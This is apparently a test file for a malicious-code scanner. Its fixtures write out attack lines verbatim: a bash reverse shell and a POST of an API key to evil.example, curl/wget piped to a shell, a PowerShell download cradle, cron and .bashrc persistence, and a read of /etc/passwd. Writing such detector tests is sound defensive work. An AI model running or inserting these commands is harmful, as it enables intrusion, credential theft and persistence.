import { test } from "node:test";
import assert from "node:assert/strict";
import { CATEGORY, RULES, extractHosts, hasReadAndSend, ruleById, scanText } from "../lib/rules.js";

test("rule table grew to 60 in v1.2", () => {
  assert.equal(RULES.length, 60);
  const by = {};
  for (const r of RULES) by[r.severity] = (by[r.severity] || 0) + 1;
  assert.equal(by.high, 31);
  assert.equal(by.medium, 24);
  assert.equal(by.low, 5);
});

test("v1.2 rules: reverse shell, symlink, persistence, exfil", () => {
  const hits = scanText("install.sh", [
    "bash -i >& /dev/tcp/evil.example/4444",
    "fs.symlinkSync('/etc', 'link')",
    "echo 'alias x=curl evil | sh' >> ~/.bashrc",
    "crontab -e; echo '* * * * * curl evil | sh' | crontab -",
    "fetch('https://evil.example/x', { method: 'POST', body: process.env.OPENAI_API_KEY })",
    "echo aGVsbG8= | base64 -d | sh",
    "wget -O- https://evil.example/x.sh | bash",
    "IEX(New-Object Net.WebClient).DownloadString('https://evil.example/x.ps1')",
  ].join("\n"));
  const ids = new Set(hits.map((h) => h.rule));
  assert.ok(ids.has("reverse_shell"));
  assert.ok(ids.has("symlink_escape"));
  assert.ok(ids.has("rc_persistence"));
  assert.ok(ids.has("cron_persistence"));
  assert.ok(ids.has("exfil_post"));
  assert.ok(ids.has("encoded_pipe_sh"));
  assert.ok(ids.has("wget_exec"));
  assert.ok(ids.has("ps_download_exec"));
});

test("node_eval and ip_obfuscation fire", () => {
  const hits = scanText("build.js", "node -e \"require('fs').readFileSync('/etc/passwd')\"\nconst ip = 0x7f000001;");
  const ids = new Set(hits.map((h) => h.rule));
  assert.ok(ids.has("node_eval"));
  assert.ok(ids.has("ip_obfuscation"));
});

test("rule table is sane", () => {
  assert.ok(RULES.length > 30);
  const ids = new Set();
  for (const r of RULES) {
    assert.ok(!ids.has(r.id), "duplicate rule id " + r.id);
    ids.add(r.id);
    assert.ok(["high", "medium", "low"].includes(r.severity));
    assert.ok(r.re instanceof RegExp);
    assert.ok(r.re.flags.includes("g"), r.id + " must be global");
  }
});

test("ruleById returns the rule", () => {
  assert.equal(ruleById("eval_call").severity, "high");
  assert.equal(ruleById("nope"), undefined);
});

test("exec and shell patterns fire on malicious install script", () => {
  const code = [
    "const { execSync, exec } = require('child_process');",
    "execSync('curl http://evil.example/x.sh | sh');",
    "exec('wget http://evil.example/x');",
    "eval(atob('c2VjcmV0'));",
    "spawn('powershell', ['-enc', 'QQ=='], { shell: true });",
  ].join("\n");
  const hits = scanText("install.js", code);
  const ids = new Set(hits.map((h) => h.rule));
  assert.ok(ids.has("exec_sync"));
  assert.ok(ids.has("exec_api"));
  assert.ok(ids.has("download_cmd"));
  assert.ok(ids.has("pipe_to_shell"));
  assert.ok(ids.has("shell_true"));
  assert.ok(ids.has("eval_call"));
  assert.ok(ids.has("ps_encoded"));
  const high = hits.filter((h) => h.severity === "high");
  assert.ok(high.length >= 6, "expected several high hits, got " + high.length);
});

test("benign module code stays low-signal", () => {
  const code = [
    "export function add(a, b) {",
    "  return a + b;",
    "}",
    "export const VERSION = '1.2.3';",
  ].join("\n");
  const hits = scanText("lib/util.js", code);
  assert.equal(hits.length, 0);
});

test("line numbers and evidence are reported", () => {
  const code = "const a = 1;\nconst b = 2;\nbad(); eval('x');\n";
  const hits = scanText("x.js", code);
  const ev = hits.find((h) => h.rule === "eval_call");
  assert.ok(ev, "eval hit missing");
  assert.equal(ev.line, 3);
  assert.ok(ev.evidence.includes("eval('x')"));
});

test("minCount thresholds require dense escapes", () => {
  const sparse = "const s = '\\x41\\x42\\x43';";
  assert.equal(scanText("sparse.js", sparse).filter((h) => h.rule === "hex_escapes").length, 0);
  const dense = "const s = '\\x41\\x42\\x43\\x44\\x45\\x46\\x47';";
  const hit = scanText("dense.js", dense).find((h) => h.rule === "hex_escapes");
  assert.ok(hit, "dense hex escapes should fire");
  assert.ok(hit.count >= 6);
});

test("secrets and network signatures fire", () => {
  const code = [
    "const key = 'sk-abc123def456ghi789jkl';",
    "fetch('https://api.telegram.org/bot123:abc/sendMessage');",
    "fetch('https://169.254.169.254/latest/meta-data/iam/security-credentials/');",
    "const token = 'ghp_abcdefghijklmnopqrstuvwx';",
  ].join("\n");
  const hits = scanText("leak.js", code);
  const ids = new Set(hits.map((h) => h.rule));
  assert.ok(ids.has("sk_key"));
  assert.ok(ids.has("webhook"));
  assert.ok(ids.has("cloud_metadata"));
  assert.ok(ids.has("gh_token"));
});

test("credential env reads and system writes fire", () => {
  const code = [
    "const k = process.env.OPENAI_API_KEY;",
    "fs.writeFileSync('/etc/cron.d/x', 'payload');",
    "fs.writeFileSync(os.homedir() + '/.bashrc', 'alias x=evil');",
  ].join("\n");
  const hits = scanText("p.js", code);
  const ids = new Set(hits.map((h) => h.rule));
  assert.ok(ids.has("env_secret_key"));
  assert.ok(ids.has("write_system"));
  assert.ok(ids.has("write_home"));
  assert.ok(ids.has("dotfile_write"));
});

test("extractHosts collects unique hostnames", () => {
  const text = "see https://api.example.com/a and http://api.example.com/b and https://other.test.io/";
  assert.deepEqual(extractHosts(text), ["api.example.com", "other.test.io"]);
});

test("hasReadAndSend detects exfil shape", () => {
  assert.equal(hasReadAndSend("readFileSync('x'); fetch('http://e.com')"), true);
  assert.equal(hasReadAndSend("readFileSync('x')"), false);
  assert.equal(hasReadAndSend("fetch('http://e.com')"), false);
});
